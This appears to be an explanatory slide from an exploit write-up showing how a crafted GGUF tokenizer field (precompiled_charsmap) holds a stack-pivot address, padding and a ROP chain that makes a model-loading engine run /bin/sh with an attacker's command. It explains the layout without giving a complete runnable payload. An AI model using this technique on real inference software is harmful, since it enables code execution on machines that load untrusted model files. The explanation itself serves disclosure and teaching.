The payload blob — and where its numbers come from

The goal Make the engine run execvp("/bin/sh", {"/bin/sh", "-c", &cmd, NULL}).

tokenizer.ggml.precompiled_charsmap (UINT8)
offset   contents
──────   ────────────────
   0     0  (NULL)
   8     PIVOT  0x236f81c
 16,24   junk
  32 …   ROP chain

what lives at 0x236f81c — the pivot gadget
pop rsi ; pop rsp ; pop rbx ; pop r14 ; pop rbp ; ret
          ▲
          └ the actual pivot: loads a new RSP that
            points into our blob → the chain at +32
why those numbers
  • 0 / 8 the destructor we just saw frees two buffers back-to-back, read as consecutive 8-byte pointers — NULL at 0, the live one one pointer later, at 8
  • PIVOT 0x236f81c is a real stack-pivot gadget inside the non-PIE binary — a fixed address found by scanning, no leak. Its pop rsp re-points the stack onto our blob
  • 16 / 24 swallowed by that gadget's trailing pop r14 ; pop rbp, so they can be junk; ret then lands on the chain at 32
  • 160 the command text, parked just past the chain

Chain and command share this one blob — after the pivot RSP points inside it, so the chain finds the command relative to itself. UINT8 keeps the NUL-heavy addresses intact.
